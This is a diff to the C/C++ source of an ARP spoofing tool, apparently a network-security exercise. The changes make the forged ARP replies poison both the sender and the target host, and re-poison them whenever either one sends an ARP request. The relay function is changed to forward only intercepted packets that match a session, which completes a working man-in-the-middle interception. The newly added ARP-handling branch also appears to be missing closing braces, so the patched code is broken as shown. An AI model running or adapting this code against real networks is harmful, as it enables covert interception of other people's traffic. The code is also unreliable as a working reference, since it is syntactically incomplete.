@@ -93,15 +93,18 @@ void arp_infection() {
 	for(int i = 0; i < session_cnt; i++) {
 		session s = ip_vector[i];
 		send_pkt(ip2mac[s.sender_ip], my_mac, ip2mac[s.sender_ip], (uint8_t *)&s.sender_ip, (uint8_t *)&s.target_ip, static_cast<uint16_t>(0x0200));
+		send_pkt(ip2mac[s.target_ip], my_mac, ip2mac[s.target_ip], (uint8_t *)&s.target_ip, (uint8_t *)&s.sender_ip, static_cast<uint16_t>(0x0200));
 	}
 }
 
 void pkt_relay_recover(unsigned char *param, const struct pcap_pkthdr *header,const unsigned char *pkt_data)
 {
-  struct ether_header * ethernet = (struct ether_header *)pkt_data;
-  for(int i = 0; i < session_cnt; i++) {
-  	if((!memcmp(ip2mac[ip_vector[i].sender_ip], ethernet -> ether_shost, 6)) && (!memcmp(my_mac, ethernet -> ether_dhost, 6))) {
-  		if(ethernet -> ether_type == htons(0x0800)) {
+	struct ether_header * ethernet = (struct ether_header *)pkt_data;
+	int flag = 0;
+	for(int i = 0; i < session_cnt; i++) {
+		if((!memcmp(ip2mac[ip_vector[i].sender_ip], ethernet -> ether_shost, 6)) && (!memcmp(my_mac, ethernet -> ether_dhost, 6))) {
+			if(ethernet -> ether_type == htons(0x0800)) {
+				flag = 1;
 				memcpy(ethernet -> ether_shost, my_mac, 6);
 				memcpy(ethernet -> ether_dhost, ip2mac[ip_vector[i].target_ip], 6);
 			}
@@ -109,22 +112,30 @@ void pkt_relay_recover(unsigned char *param, const struct pcap_pkthdr *header,co
 				struct arp_header * arp = (struct arp_header *)(pkt_data + 14);
 				if((arp -> arp_op == htons(0x0001)) && (!memcmp(arp -> arp_tpa, (uint8_t*)&ip_vector[i].target_ip, 4))) {
 					send_pkt(ip2mac[ip_vector[i].sender_ip], my_mac, ip2mac[ip_vector[i].sender_ip], (uint8_t *)&ip_vector[i].sender_ip, (uint8_t *)&ip_vector[i].target_ip, static_cast<uint16_t>(0x0200));
+					send_pkt(ip2mac[ip_vector[i].target_ip], my_mac, ip2mac[ip_vector[i].target_ip], (uint8_t *)&ip_vector[i].target_ip, (uint8_t *)&ip_vector[i].sender_ip, static_cast<uint16_t>(0x0200));
 				}
 			}
 			break;
 		} 
 		else if((!memcmp(ip2mac[ip_vector[i].target_ip], ethernet -> ether_shost, 6)) && (!memcmp(my_mac, ethernet -> ether_dhost, 6))) {
 			if(ethernet -> ether_type == htons(0x0800)) {
-  			struct ip_header * ip = (struct ip_header *)(pkt_data + 14);	
+				struct ip_header * ip = (struct ip_header *)(pkt_data + 14);	
 				if(ip -> ip_dst == ip_vector[i].sender_ip) {
+					flag = 1;
 					memcpy(ethernet -> ether_shost, my_mac, 6);
 					memcpy(ethernet -> ether_dhost, ip2mac[ip_vector[i].sender_ip], 6);
 				}
 			}
+			else if(ethernet -> ether_type == htons(0x0806)) {
+				struct arp_header * arp = (struct arp_header *)(pkt_data + 14);
+				if((arp -> arp_op == htons(0x0001)) && (!memcmp(arp -> arp_tpa, (uint8_t*)&ip_vector[i].sender_ip, 4))) {
+					send_pkt(ip2mac[ip_vector[i].sender_ip], my_mac, ip2mac[ip_vector[i].sender_ip], (uint8_t *)&ip_vector[i].sender_ip, (uint8_t *)&ip_vector[i].target_ip, static_cast<uint16_t>(0x0200));
+					send_pkt(ip2mac[ip_vector[i].target_ip], my_mac, ip2mac[ip_vector[i].target_ip], (uint8_t *)&ip_vector[i].target_ip, (uint8_t *)&ip_vector[i].sender_ip, static_cast<uint16_t>(0x0200));
 			break;
 		}
 	}
-	pcap_sendpacket(fp, pkt_data, header->caplen);
+	if(flag == 1)
+		pcap_sendpacket(fp, pkt_data, header->caplen);
 }
 	
 void add_to_num(char * address, uint8_t * ip) {
